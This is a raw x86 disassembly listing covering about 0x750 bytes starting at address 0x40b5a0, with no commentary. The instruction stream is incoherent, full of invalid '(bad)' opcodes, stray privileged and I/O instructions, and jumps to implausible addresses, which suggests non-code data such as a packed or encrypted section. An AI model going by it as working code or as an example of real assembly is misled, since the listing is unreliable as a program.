  40b5a0:	(bad)  
  40b5a1:	repz inc ebx
  40b5a3:	in     eax,0x7f
  40b5a5:	add    ebx,DWORD PTR [eax-0x64]
  40b5a8:	in     eax,dx
  40b5a9:	push   eax
  40b5aa:	mov    ebx,DWORD PTR [ebp-0x5a7ba5b9]
  40b5b0:	(bad)  
  40b5b1:	jp     0x40b545
  40b5b3:	and    esi,DWORD PTR [edx-0x2]
  40b5b6:	sub    DWORD PTR [eax+0x7620ec77],0x5e4afbfc
  40b5c0:	cdq    
  40b5c1:	fld1   
  40b5c3:	cld    
  40b5c4:	pop    eax
  40b5c5:	push   edx
  40b5c6:	xor    al,0xcf
  40b5c8:	jo     0x40b5d7
  40b5ca:	jns    0x40b5e9
  40b5cc:	into   
  40b5cd:	mov    dh,0x8a
  40b5cf:	push   ebp
  40b5d0:	or     DWORD PTR [ecx+0x59],ecx
  40b5d3:	cmp    dl,bh
  40b5d5:	and    esi,edi
  40b5d7:	sub    BYTE PTR [esi+0x69],dl
  40b5da:	dec    esi
  40b5db:	dec    esp
  40b5dc:	sub    esp,ebx
  40b5de:	mov    dh,0x84
  40b5e0:	pop    edx
  40b5e1:	mov    DWORD PTR [ecx+0x19703440],edi
  40b5e7:	data16 jg 0x40b56a
  40b5ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5eb:	jl     0x40b669
  40b5ed:	into   
  40b5ee:	adc    esp,DWORD PTR [edi]
  40b5f0:	mov    bh,0x75
  40b5f2:	jecxz  0x40b629
  40b5f4:	cld    
  40b5f5:	(bad)  
  40b5f6:	arpl   WORD PTR [ebx+0x8502c1e],bx
  40b5fc:	jecxz  0x40b5c0
  40b5fe:	mov    bh,0xa2
  40b600:	add    cl,BYTE PTR [edx+ebx*8-0x3ad05b26]
  40b607:	fist   WORD PTR [esi+0x4e]
  40b60a:	fldenv [esi]
  40b60c:	mov    bl,0xb8
  40b60e:	add    bl,BYTE PTR [ebp+0x25]
  40b611:	xor    ebx,eax
  40b613:	psrlw  mm5,QWORD PTR [edi+edx*2+0x689c10e3]
  40b61b:	xor    BYTE PTR [ecx],dl
  40b61d:	aad    0x5c
  40b61f:	xchg   ebx,eax
  40b620:	pusha  
  40b621:	mov    bh,0x12
  40b623:	mov    ch,0x3b
  40b625:	push   cs
  40b626:	in     al,dx
  40b627:	sub    DWORD PTR [eax],0x40dfd5bc
  40b62d:	leave  
  40b62e:	xor    BYTE PTR [ebp-0x1f],0xbe
  40b632:	mov    esi,0xa5ca21c
  40b637:	push   ebx
  40b638:	jp     0x40b6ad
  40b63a:	outs   dx,BYTE PTR ds:[esi]
  40b63b:	ror    DWORD PTR [eax+0x78],1
  40b63e:	push   ss
  40b63f:	fiadd  WORD PTR [ebx+0x11]
  40b642:	loopne 0x40b5d4
  40b644:	push   ds
  40b645:	fwait
  40b646:	ret    
  40b647:	into   
  40b648:	sbb    DWORD PTR [edi+eax*2],esp
  40b64b:	ret    0x599f
  40b64e:	icebp  
  40b64f:	pop    edx
  40b650:	inc    ebp
  40b651:	mov    al,0x4e
  40b653:	das    
  40b654:	js     0x40b612
  40b656:	xor    al,BYTE PTR [edx+eiz*4+0x65]
  40b65a:	mov    esp,DWORD PTR [ebp-0x68]
  40b65d:	lods   al,BYTE PTR ds:[esi]
  40b65e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b65f:	outs   dx,DWORD PTR ds:[esi]
  40b660:	repnz mov edx,0xd66fb01c
  40b666:	out    0x2c,eax
  40b668:	dec    ebx
  40b669:	adc    BYTE PTR [ecx-0x5],ch
  40b66c:	shl    al,1
  40b66e:	lahf   
  40b66f:	stc    
  40b670:	int3   
  40b671:	ror    eax,1
  40b673:	test   DWORD PTR [edx+eax*1-0x22c6e0c0],0xf4b75765
  40b67e:	mov    dh,0xa3
  40b680:	icebp  
  40b681:	cs xchg ebx,eax
  40b683:	add    eax,0xd5dd6cb
  40b688:	repnz add bh,BYTE PTR [ebp+0x1c]
  40b68c:	or     ah,BYTE PTR [esi]
  40b68e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b68f:	inc    eax
  40b690:	jb     0x40b688
  40b692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b693:	aas    
  40b694:	sub    DWORD PTR [esi+0xa],edx
  40b697:	cmp    eax,0xdc2bec30
  40b69c:	inc    edx
  40b69d:	aam    0xb2
  40b69f:	ficomp DWORD PTR [edx-0x482a8813]
  40b6a5:	push   ss
  40b6a6:	pop    ebp
  40b6a7:	mov    al,0x14
  40b6a9:	(bad)  
  40b6aa:	mov    cl,dl
  40b6ac:	pop    ecx
  40b6ad:	loopne 0x40b6a2
  40b6af:	mov    bl,0xc
  40b6b1:	pushf  
  40b6b2:	xchg   ecx,eax
  40b6b3:	jmp    0xa1fdc471
  40b6b8:	mov    bl,0xff
  40b6ba:	aaa    
  40b6bb:	dec    BYTE PTR [ebx]
  40b6bd:	sbb    al,0x53
  40b6bf:	inc    esp
  40b6c0:	sub    eax,0x3a46a10b
  40b6c5:	xor    ah,dl
  40b6c7:	lds    edx,FWORD PTR [ebp-0x59]
  40b6ca:	mov    gs,WORD PTR [ebx+0x7d01c10a]
  40b6d0:	jo     0x40b67e
  40b6d2:	scas   eax,DWORD PTR es:[edi]
  40b6d3:	mov    ecx,0x73213686
  40b6d8:	test   DWORD PTR [esp+eax*2+0x9],0x3dc150c1
  40b6e0:	mov    cl,0xf5
  40b6e2:	enter  0x87b0,0x72
  40b6e6:	sbb    bh,BYTE PTR [ecx+eiz*2-0x7f]
  40b6ea:	aam    0x5e
  40b6ec:	jns    0x40b736
  40b6ee:	sbb    esi,DWORD PTR [eax-0x5f167e1e]
  40b6f4:	fadd   st(5),st
  40b6f6:	xor    BYTE PTR [eax+edx*2],ah
  40b6f9:	sbb    cl,bh
  40b6fb:	sbb    BYTE PTR [ebp+eax*4-0x6178ce13],0x4b
  40b703:	mov    ch,0xfc
  40b705:	sub    eax,DWORD PTR [eax]
  40b707:	dec    esp
  40b708:	mov    ecx,0xad943adb
  40b70d:	xor    eax,DWORD PTR [eax+0x71c89939]
  40b713:	pop    eax
  40b714:	jle    0x40b6b5
  40b716:	inc    ebx
  40b717:	lea    eax,[edx+0x19d1df2b]
  40b71d:	xlat   BYTE PTR ds:[ebx]
  40b71e:	dec    eax
  40b71f:	ins    DWORD PTR es:[edi],dx
  40b720:	or     eax,0x29d6a41d
  40b725:	xchg   BYTE PTR [ebp-0x61],ah
  40b728:	aas    
  40b729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b72a:	es push esp
  40b72c:	or     al,0x29
  40b72e:	fidiv  WORD PTR [edx]
  40b730:	fimul  WORD PTR [ebx-0x1a]
  40b733:	lods   eax,DWORD PTR ds:[esi]
  40b734:	leave  
  40b735:	outs   dx,DWORD PTR ds:[esi]
  40b736:	int    0xa5
  40b738:	mov    eax,0x9af0a6ab
  40b73d:	pop    edx
  40b73e:	(bad)  
  40b73f:	mov    esp,0x960b1425
  40b744:	(bad)  
  40b745:	xchg   edi,eax
  40b746:	push   0x938c2ae8
  40b74b:	aad    0xbf
  40b74d:	sub    edi,esi
  40b74f:	lods   eax,DWORD PTR ds:[esi]
  40b750:	ss repnz pop esp
  40b753:	pop    eax
  40b754:	xchg   ebp,eax
  40b755:	push   ss
  40b756:	mov    edx,0x3b1eae62
  40b75b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b75c:	and    BYTE PTR [edx+0x4a],dh
  40b75f:	xor    DWORD PTR es:0x5cff7482,ecx
  40b766:	mov    ebx,0x8c1d1c63
  40b76b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b76c:	jbe    0x40b7bf
  40b76e:	inc    ebx
  40b76f:	(bad)  
  40b770:	inc    edx
  40b771:	lods   eax,DWORD PTR ds:[esi]
  40b772:	xchg   esi,eax
  40b773:	retf   0x7d70
  40b776:	inc    esi
  40b777:	inc    eax
  40b778:	mov    eax,ds:0xe969bff2
  40b77d:	call   0xed8e:0x277a55a3
  40b784:	je     0x40b781
  40b786:	xchg   DWORD PTR [edx],esi
  40b788:	ds xor eax,0x48fc8ec0
  40b78e:	xchg   esi,eax
  40b78f:	pushf  
  40b790:	ins    BYTE PTR es:[edi],dx
  40b791:	int3   
  40b792:	xchg   ecx,eax
  40b793:	loope  0x40b7db
  40b795:	add    esi,DWORD PTR [edi+0x2f8e1173]
  40b79b:	in     eax,0xe1
  40b79d:	jmp    0x943f7db3
  40b7a2:	fs scas eax,DWORD PTR es:[edi]
  40b7a4:	dec    esi
  40b7a5:	adc    bh,BYTE PTR [eax-0x1beac13e]
  40b7ab:	sbb    al,BYTE PTR [esi-0x6a]
  40b7ae:	lea    edi,[ebx]
  40b7b0:	and    eax,0x4a7a8d01
  40b7b5:	(bad)  
  40b7b7:	(bad)  
  40b7b8:	jmp    0x40b773
  40b7ba:	mov    bh,0x90
  40b7bc:	pop    es
  40b7bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7be:	arpl   WORD PTR [esi+0x6e],bx
  40b7c1:	xor    al,0x35
  40b7c3:	jl     0x40b80b
  40b7c5:	iret   
  40b7c6:	sbb    BYTE PTR [edi+0x48b21e97],bh
  40b7cc:	xchg   esi,eax
  40b7cd:	push   esi
  40b7ce:	mov    esi,0x21f7579f
  40b7d3:	aas    
  40b7d4:	ret    
  40b7d5:	adc    dh,BYTE PTR [ebp+0x7a]
  40b7d8:	js     0x40b846
  40b7da:	ror    BYTE PTR [ebp-0x11],1
  40b7dd:	data16 (bad) 
  40b7df:	or     eax,0x4edd54c7
  40b7e4:	sub    cl,BYTE PTR [eax]
  40b7e6:	jae    0x40b76e
  40b7e8:	stos   BYTE PTR es:[edi],al
  40b7e9:	push   0xf4b67f3
  40b7ee:	in     al,0xb9
  40b7f0:	lods   eax,DWORD PTR ds:[esi]
  40b7f1:	mov    dl,0x0
  40b7f3:	das    
  40b7f4:	stc    
  40b7f5:	call   0x7576:0x49551a58
  40b7fc:	mov    ds:0x18714c36,eax
  40b801:	sbb    bh,BYTE PTR [eax+0x0]
  40b804:	or     BYTE PTR [ecx+0x4815a004],cl
  40b80a:	sub    al,0x2f
  40b80c:	jl     0x40b83d
  40b80e:	rol    ebx,cl
  40b810:	push   0x51
  40b812:	pop    sp
  40b814:	fwait
  40b815:	shl    edx,0x73
  40b818:	xor    BYTE PTR [eax],0x2
  40b81b:	cmp    eax,0x70ce178a
  40b820:	mov    dh,0x42
  40b822:	and    ah,0xbf
  40b825:	test   al,0xc0
  40b827:	es test al,0x34
  40b82a:	xchg   esi,eax
  40b82b:	xchg   esi,eax
  40b82c:	and    eax,0xbd887ab6
  40b831:	jp     0x40b7ca
  40b833:	repnz fwait
  40b835:	lahf   
  40b836:	cld    
  40b837:	gs popa 
  40b839:	jno    0x40b7e1
  40b83b:	pop    edx
  40b83c:	or     al,0x8b
  40b83e:	mov    ebp,0x1e7921
  40b843:	sbb    BYTE PTR [edi],al
  40b845:	fwait
  40b846:	mov    ?,WORD PTR [esi+edi*8+0x7fe5118e]
  40b84d:	xchg   ebp,eax
  40b84e:	push   esp
  40b84f:	dec    esp
  40b850:	push   ebp
  40b851:	test   eax,0xb6a7725
  40b856:	repz es mov ds,esi
  40b85a:	xchg   edx,eax
  40b85b:	inc    esp
  40b85c:	jae    0x40b809
  40b85e:	xchg   esi,eax
  40b85f:	cmp    DWORD PTR [ecx-0x63],0x7e
  40b863:	rcr    DWORD PTR [eax+eax*8+0x17],0xc1
  40b868:	inc    esi
  40b869:	sbb    ecx,DWORD PTR [edx-0x1e]
  40b86c:	call   0x844:0x425660f
  40b873:	mov    ebx,0xda0efef
  40b878:	imul   ecx,edx,0x23
  40b87b:	jle    0x40b80e
  40b87d:	sub    eax,0x8ef8688
  40b882:	cmc    
  40b883:	cmp    bl,BYTE PTR [ebx+0x11015364]
  40b889:	sub    cl,dh
  40b88b:	daa    
  40b88c:	test   DWORD PTR [edi+0x6],esp
  40b88f:	pop    edi
  40b890:	sub    eax,DWORD PTR ds:0xd4985203
  40b896:	sub    ecx,edi
  40b898:	sbb    ah,BYTE PTR [eax]
  40b89a:	(bad)  
  40b89b:	es jb  0x40b914
  40b89e:	loopne 0x40b8e9
  40b8a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8a1:	mov    ds:0x8daf565,eax
  40b8a6:	fs pop es
  40b8a8:	adc    bl,BYTE PTR [ebx]
  40b8aa:	push   edx
  40b8ab:	ret    
  40b8ac:	mov    ebx,0x2a4b1146
  40b8b1:	fsub   st(5),st
  40b8b3:	mov    edx,0x784f645
  40b8b8:	ror    DWORD PTR [esi+0x628c1fcb],cl
  40b8be:	popf   
  40b8bf:	retf   
  40b8c0:	dec    esp
  40b8c1:	sbb    ch,BYTE PTR [edx]
  40b8c3:	or     BYTE PTR [edi],cl
  40b8c5:	mov    bh,0xbe
  40b8c7:	arpl   WORD PTR [eax+edx*2],si
  40b8ca:	push   0x29fd4c8
  40b8cf:	shl    ebx,1
  40b8d1:	xchg   edi,eax
  40b8d2:	loopne 0x40b8d8
  40b8d4:	add    ecx,DWORD PTR [eax+ecx*1-0x72096c03]
  40b8db:	mov    edx,DWORD PTR [edi-0x1c]
  40b8de:	xchg   DWORD PTR [ebp+0x4b062e70],ecx
  40b8e4:	sub    edx,0x59
  40b8e7:	mov    esi,DWORD PTR ss:[edi]
  40b8ea:	jno    0x40b935
  40b8ec:	xchg   ebp,eax
  40b8ed:	inc    edi
  40b8ee:	in     eax,dx
  40b8ef:	pop    esi
  40b8f0:	mov    BYTE PTR [esi-0x7d],dl
  40b8f3:	sbb    dl,BYTE PTR [ebp+ebx*1-0xffb7678]
  40b8fa:	dec    eax
  40b8fb:	data16 int 0xd9
  40b8fe:	pop    esi
  40b8ff:	cmp    BYTE PTR [ebx],dh
  40b901:	or     al,0x59
  40b903:	ret    
  40b904:	shl    DWORD PTR [ebx-0x7d],0x59
  40b908:	add    DWORD PTR [ebp-0x7b],edi
  40b90b:	inc    esp
  40b90c:	pop    esp
  40b90d:	add    dl,0xf7
  40b910:	cmp    BYTE PTR [edx],ah
  40b912:	js     0x40b97a
  40b914:	and    eax,0x4cc95e19
  40b919:	xor    eax,0x9a877b5a
  40b91e:	lock stos BYTE PTR es:[edi],al
  40b920:	pop    ebp
  40b921:	xlat   BYTE PTR ds:[ebx]
  40b922:	sub    bh,BYTE PTR [edi]
  40b924:	lods   eax,DWORD PTR ds:[esi]
  40b925:	out    dx,al
  40b926:	loopne 0x40b982
  40b928:	or     BYTE PTR [edx+0x352bec1],0x42
  40b92f:	scas   eax,DWORD PTR es:[edi]
  40b930:	and    eax,DWORD PTR [eax+0x7e5154b4]
  40b936:	add    edx,ebp
  40b938:	rol    edi,cl
  40b93a:	js     0x40b978
  40b93c:	inc    esi
  40b93d:	sbb    BYTE PTR [eax-0x67ef4c70],ch
  40b943:	dec    eax
  40b944:	cld    
  40b945:	retf   0x314a
  40b948:	xchg   edi,eax
  40b949:	cdq    
  40b94a:	stos   DWORD PTR es:[edi],eax
  40b94b:	mov    al,0x7e
  40b94d:	mov    WORD PTR [eax+0x34],gs
  40b950:	push   edi
  40b951:	fwait
  40b952:	adc    al,0xfc
  40b954:	stos   BYTE PTR es:[edi],al
  40b955:	in     eax,dx
  40b956:	and    edx,DWORD PTR [eax+0x1de1920d]
  40b95c:	xor    BYTE PTR [eax],0xab
  40b95f:	push   eax
  40b960:	xchg   esp,eax
  40b961:	dec    ecx
  40b962:	sbb    al,0xe4
  40b964:	sub    al,bl
  40b966:	inc    ebx
  40b967:	push   0x5fc1e440
  40b96c:	enter  0xa0da,0xff
  40b970:	cld    
  40b971:	(bad)  
  40b972:	push   edx
  40b973:	push   edx
  40b974:	ja     0x40b9e1
  40b976:	sar    BYTE PTR [eax+esi*1+0x69],0x62
  40b97b:	mov    gs,WORD PTR [edi-0x16]
  40b97e:	nop
  40b97f:	popa   
  40b980:	ja     0x40b995
  40b982:	adc    DWORD PTR [edi+ebx*2+0x6f197d9f],ecx
  40b989:	out    dx,al
  40b98a:	imul   ecx,DWORD PTR [edi],0x12573c9d
  40b990:	xor    BYTE PTR [esp+ecx*1+0x51],bh
  40b994:	xchg   ebx,eax
  40b995:	fnstcw WORD PTR [ecx]
  40b997:	mov    ds:0x507fd6ab,eax
  40b99c:	and    bl,BYTE PTR [edi+0x1cebaf66]
  40b9a2:	add    eax,0x944d7ab
  40b9a7:	int3   
  40b9a8:	lahf   
  40b9a9:	adc    DWORD PTR [edi-0x41],esi
  40b9ac:	cmp    DWORD PTR [eax],0xb74e5a7c
  40b9b2:	icebp  
  40b9b3:	(bad)  
  40b9b4:	sbb    DWORD PTR [edx],edx
  40b9b6:	daa    
  40b9b7:	xchg   edi,eax
  40b9b8:	xor    al,0x4a
  40b9ba:	xor    cl,0xc4
  40b9bd:	mov    ds:0x7d25295e,eax
  40b9c2:	xchg   bh,dl
  40b9c4:	pop    ds
  40b9c5:	and    BYTE PTR [ecx+0x296211c8],bl
  40b9cb:	dec    ebp
  40b9cc:	aad    0x3b
  40b9ce:	scas   al,BYTE PTR es:[edi]
  40b9cf:	inc    edx
  40b9d0:	iret   
  40b9d1:	ins    BYTE PTR es:[edi],dx
  40b9d2:	sbb    eax,0x2176f12f
  40b9d7:	or     DWORD PTR [ebx-0x24],eax
  40b9da:	or     DWORD PTR [ecx+0xe206f17],0xc8e4342
  40b9e4:	(bad)  
  40b9e5:	xchg   esp,eax
  40b9e6:	mov    fs,esp
  40b9e8:	dec    edx
  40b9e9:	es ins BYTE PTR es:[edi],dx
  40b9eb:	mov    ebp,0x4b336f62
  40b9f0:	or     BYTE PTR [ebx-0x46],dh
  40b9f3:	stos   DWORD PTR es:[edi],eax
  40b9f4:	aad    0xb5
  40b9f6:	xor    eax,0x8e58e2f9
  40b9fb:	mov    cl,0x2
  40b9fd:	ror    DWORD PTR [ebx],cl
  40b9ff:	xlat   BYTE PTR ds:[ebx]
  40ba00:	popa   
  40ba01:	pop    eax
  40ba02:	sahf   
  40ba03:	cmc    
  40ba04:	popa   
  40ba05:	das    
  40ba06:	mov    eax,0x4376a5ff
  40ba0b:	test   eax,0x5d3e686c
  40ba10:	hlt    
  40ba11:	shl    BYTE PTR [ecx-0x4e91c88f],0xa0
  40ba18:	jg     0x40b9fb
  40ba1a:	fsubr  DWORD PTR [ebx-0x26]
  40ba1d:	out    dx,eax
  40ba1e:	repnz pop ebp
  40ba20:	dec    ecx
  40ba21:	pop    esi
  40ba22:	bound  ebp,QWORD PTR [ecx-0x7f41f788]
  40ba28:	push   edi
  40ba29:	scas   al,BYTE PTR es:[edi]
  40ba2a:	(bad)  
  40ba2b:	cli    
  40ba2c:	jbe    0x40ba1d
  40ba2e:	icebp  
  40ba2f:	call   0xe2e75610
  40ba34:	dec    eax
  40ba36:	fs jns 0x40b9f8
  40ba39:	xchg   ecx,eax
  40ba3a:	push   eax
  40ba3b:	fwait
  40ba3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba3d:	retf   0x792e
  40ba40:	sbb    BYTE PTR [ecx-0x51b53d18],al
  40ba46:	(bad)  
  40ba48:	mov    ds:0xd82dfd42,al
  40ba4d:	xchg   ebp,eax
  40ba4e:	jle    0x40ba8b
  40ba50:	jge    0x40ba40
  40ba52:	push   cs
  40ba53:	test   al,0x5
  40ba55:	imul   eax,DWORD PTR [ecx-0x161b3349],0x2dab863a
  40ba5f:	adc    eax,0xdc160739
  40ba64:	cwde   
  40ba65:	mov    dh,0xac
  40ba67:	std    
  40ba68:	es enter 0xe19e,0xaf
  40ba6d:	popa   
  40ba6e:	jb     0x40ba54
  40ba70:	cmc    
  40ba71:	adc    BYTE PTR [ebx+0x4],dh
  40ba74:	inc    esi
  40ba75:	cld    
  40ba76:	arpl   WORD PTR [edx+0x6dcde130],cx
  40ba7c:	js     0x40baeb
  40ba7e:	shl    BYTE PTR [ecx-0x76cdaee0],cl
  40ba84:	sbb    esi,DWORD PTR [ebp-0x50e5a23b]
  40ba8a:	pop    edi
  40ba8b:	icebp  
  40ba8c:	mov    ds:0x63f72bf7,eax
  40ba91:	pop    ss
  40ba92:	mov    edi,0x8d269f5f
  40ba97:	test   al,0x92
  40ba99:	test   eax,0xe4cebb45
  40ba9e:	xchg   edi,ebx
  40baa0:	xor    dl,BYTE PTR [edx]
  40baa2:	std    
  40baa3:	bound  edx,QWORD PTR [edi-0x3d81228e]
  40baa9:	and    al,0xdf
  40baab:	xchg   cl,cl
  40baad:	dec    eax
  40baae:	mov    BYTE PTR [edi-0x1b],ch
  40bab1:	std    
  40bab2:	and    ecx,DWORD PTR [ecx+ebp*1+0x3dc7bc2c]
  40bab9:	pop    ds
  40baba:	shr    BYTE PTR [ebx],cl
  40babc:	mov    ah,0x12
  40babe:	data16 das 
  40bac0:	mov    al,0x48
  40bac2:	mov    esi,0x63af9e2d
  40bac7:	test   DWORD PTR [edx],eax
  40bac9:	mov    BYTE PTR [edx+esi*1],dl
  40bacc:	jl     0x40bab9
  40bace:	or     DWORD PTR [ebp+eax*4-0x7d3f9f7],esi
  40bad5:	ins    BYTE PTR es:[edi],dx
  40bad6:	push   0xffffffc6
  40bad8:	jo     0x40baec
  40bada:	daa    
  40badb:	jle    0x40ba60
  40badd:	xor    ecx,ebx
  40badf:	mov    ch,0x9e
  40bae1:	xchg   esp,eax
  40bae2:	dec    ebx
  40bae3:	mov    esi,0xb36413e7
  40bae8:	sub    DWORD PTR [ebp-0x4ca38b12],esi
  40baee:	xchg   ecx,eax
  40baef:	pop    eax
  40baf0:	clc    
  40baf1:	jge    0x40babe
  40baf3:	je     0x40bad7
  40baf5:	jae    0x40bb22
  40baf7:	sar    BYTE PTR [edi-0x31346dae],0x0
  40bafe:	jp     0x40bb1f
  40bb00:	pop    esi
  40bb01:	fild   DWORD PTR [edi+0x4bfe72da]
  40bb07:	aad    0xe5
  40bb09:	sbb    eax,ecx
  40bb0b:	and    DWORD PTR [edi],ebp
  40bb0d:	inc    ebp
  40bb0e:	(bad)  
  40bb0f:	mov    ch,0xef
  40bb11:	leave  
  40bb12:	jae    0x40bb5b
  40bb14:	mov    ds:0xeed09d4a,eax
  40bb19:	jge    0x40bb58
  40bb1b:	aaa    
  40bb1c:	cmp    cl,bl
  40bb1e:	mov    eax,ds:0xc801318a
  40bb23:	shl    BYTE PTR [esp+eiz*8],0xc
  40bb27:	push   eax
  40bb28:	data16 lods al,BYTE PTR ds:[esi]
  40bb2a:	xchg   BYTE PTR [ebp+0x2f30d087],bl
  40bb30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb31:	dec    edx
  40bb32:	cli    
  40bb33:	push   eax
  40bb34:	repnz mov eax,0x3fdd9824
  40bb3a:	pop    ss
  40bb3b:	adc    BYTE PTR [eax],dh
  40bb3d:	jmp    0x78ed:0x37bb35d9
  40bb44:	in     al,0xa8
  40bb46:	test   DWORD PTR [edi-0x3a],ecx
  40bb49:	or     DWORD PTR [esi+0x1a],ecx
  40bb4c:	js     0x40baec
  40bb4e:	in     al,dx
  40bb4f:	les    edi,FWORD PTR [ebp+0x7d]
  40bb52:	call   0xd4b56d4c
  40bb57:	jns    0x40bb0a
  40bb59:	adc    eax,ebx
  40bb5b:	xlat   BYTE PTR ds:[ebx]
  40bb5c:	jbe    0x40bb70
  40bb5e:	inc    ebp
  40bb5f:	(bad)  
  40bb61:	cdq    
  40bb62:	push   ecx
  40bb63:	add    eax,0x97163628
  40bb68:	mov    dh,0x76
  40bb6a:	add    ah,dh
  40bb6c:	pop    esp
  40bb6d:	inc    ebp
  40bb6e:	push   ebp
  40bb6f:	and    ebp,DWORD PTR [eax-0x47]
  40bb72:	dec    edi
  40bb73:	popa   
  40bb74:	mov    al,0x19
  40bb76:	cmp    eax,0xf8a88e6e
  40bb7b:	cmp    DWORD PTR [ebx-0x53498725],0x55
  40bb82:	xchg   ebp,eax
  40bb83:	jbe    0x40bb7b
  40bb85:	cmp    eax,DWORD PTR [edx+0x407c3389]
  40bb8b:	pop    esp
  40bb8c:	adc    DWORD PTR [ebx],edi
  40bb8e:	stc    
  40bb8f:	ins    DWORD PTR es:[edi],dx
  40bb90:	int    0x34
  40bb92:	mov    ecx,0xb17329b9
  40bb97:	inc    eax
  40bb98:	jnp    0x40bb7a
  40bb9a:	mov    fs,edx
  40bb9c:	popa   
  40bb9d:	es mov esp,0xa695d172
  40bba3:	dec    eax
  40bba4:	push   cs
  40bba5:	arpl   WORD PTR [eax-0x62],bx
  40bba8:	sub    al,0x22
  40bbaa:	scas   eax,DWORD PTR es:[edi]
  40bbab:	and    eax,0x702d3d9a
  40bbb0:	iret   
  40bbb1:	adc    DWORD PTR [edx-0x26694aac],0x1b
  40bbb8:	mov    dh,0x2d
  40bbba:	mov    ebp,0x1e5c673b
  40bbbf:	push   eax
  40bbc0:	fist   WORD PTR [esi+0x1e760e8a]
  40bbc6:	out    0xb1,eax
  40bbc8:	mov    edx,0xe42717d9
  40bbcd:	loopne 0x40bbd8
  40bbcf:	cli    
  40bbd0:	xchg   esi,eax
  40bbd1:	pushf  
  40bbd2:	jp     0x40bc10
  40bbd4:	xchg   esi,eax
  40bbd5:	nop
  40bbd6:	and    al,0xeb
  40bbd8:	jne    0x40bb61
  40bbda:	ja     0x40bb93
  40bbdc:	out    dx,al
  40bbdd:	xor    ebp,DWORD PTR [ecx-0x3bdfd24]
  40bbe3:	pop    es
  40bbe4:	lahf   
  40bbe5:	push   ebp
  40bbe6:	lea    edx,[esi+0x1d211b75]
  40bbec:	or     eax,0x7eee155b
  40bbf1:	inc    edi
  40bbf2:	inc    esi
  40bbf3:	xchg   ebp,eax
  40bbf4:	popf   
  40bbf5:	xor    ebp,DWORD PTR [ebx+0x1c]
  40bbf8:	xchg   ecx,eax
  40bbf9:	aaa    
  40bbfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbfb:	or     BYTE PTR [edx-0x67954c86],bl
  40bc01:	xchg   esi,eax
  40bc02:	(bad)  
  40bc03:	pop    ds
  40bc04:	jmp    0x40bc83
  40bc06:	mov    WORD PTR [ebp+0x5970df0d],ds
  40bc0c:	shr    DWORD PTR ds:0xf892348,1
  40bc12:	sbb    esp,eax
  40bc14:	popf   
  40bc15:	jbe    0x40bba1
  40bc17:	xchg   esp,eax
  40bc18:	sar    cl,cl
  40bc1a:	and    bh,BYTE PTR [ebp+0x67bf39e7]
  40bc20:	shl    ch,cl
  40bc22:	pushf  
  40bc23:	retf   
  40bc24:	rcr    BYTE PTR [eax-0x683b5cb],cl
  40bc2a:	fwait
  40bc2b:	mov    edi,0x2c3d11e5
  40bc30:	sub    cl,BYTE PTR [ebx-0x72]
  40bc33:	jb     0x40bc38
  40bc35:	sub    BYTE PTR [esi],al
  40bc37:	dec    ebp
  40bc38:	call   0x5139:0x8c149938
  40bc3f:	pop    ebp
  40bc40:	mov    ah,0xa8
  40bc42:	add    BYTE PTR [eax],ah
  40bc44:	xor    esp,DWORD PTR [eax+0x6dfff661]
  40bc4a:	out    dx,al
  40bc4b:	mov    eax,0x8e1c080
  40bc50:	mov    eax,0x201425c9
  40bc55:	inc    eax
  40bc56:	and    eax,0x13143993
  40bc5b:	mov    ch,0xfd
  40bc5d:	inc    edi
  40bc5e:	mov    ds:0x17acc3c3,al
  40bc63:	aas    
  40bc64:	cmp    eax,0xd31ae648
  40bc69:	iret   
  40bc6a:	and    eax,DWORD PTR [ecx-0x1d]
  40bc6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc6e:	sti    
  40bc6f:	pop    esi
  40bc70:	jo     0x40bc38
  40bc72:	pop    esi
  40bc73:	mov    dh,0xc0
  40bc75:	std    
  40bc76:	or     BYTE PTR [ebp+0x21],cl
  40bc79:	fidiv  DWORD PTR [eax-0x4359f8a5]
  40bc7f:	mov    ds:0x73a2e3f4,al
  40bc84:	rcl    DWORD PTR [ecx+ebp*4-0x4a],1
  40bc88:	test   DWORD PTR [ebx+ebx*2+0x9],ecx
  40bc8c:	cmp    eax,0x40778d04
  40bc91:	ins    DWORD PTR es:[edi],dx
  40bc92:	test   al,0xb
  40bc94:	popf   
  40bc95:	push   0x25154615
  40bc9a:	call   0xd7dce2bd
  40bc9f:	inc    eax
  40bca0:	cmp    cl,BYTE PTR [esi+0x6a]
  40bca3:	xchg   al,bh
  40bca5:	jmp    0x79175a38
  40bcaa:	pop    ebp
  40bcab:	into   
  40bcac:	and    eax,0x2119b407
  40bcb1:	in     eax,dx
  40bcb2:	pop    edx
  40bcb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcb4:	(bad)  
  40bcb5:	shl    cl,0xd8
  40bcb8:	outs   dx,DWORD PTR ds:[esi]
  40bcb9:	ins    BYTE PTR es:[edi],dx
  40bcba:	jbe    0x40bc5a
  40bcbc:	jno    0x40bd2f
  40bcbe:	sbb    eax,0x98792b6f
  40bcc3:	pusha  
  40bcc4:	sti    
  40bcc5:	mov    esi,0xf7de8c5f
  40bcca:	mov    DWORD PTR [eax+0x5f],eax
  40bccd:	clc    
  40bcce:	dec    ecx
  40bccf:	dec    eax
  40bcd0:	xbegin 0x50b3f8bd
  40bcd6:	stos   BYTE PTR es:[edi],al
  40bcd7:	fdiv   QWORD PTR [edi-0x1b]
  40bcda:	mov    edx,0x43b0e911
  40bcdf:	dec    esi
  40bce0:	push   es
  40bce1:	cmp    bl,BYTE PTR [ecx+0x40f69418]
  40bce7:	out    0x89,eax
  40bce9:	out    dx,eax
  40bcea:	mov    DWORD PTR [ecx],esp
  40bcec:	icebp  
  40bced:	ds xchg ebx,eax
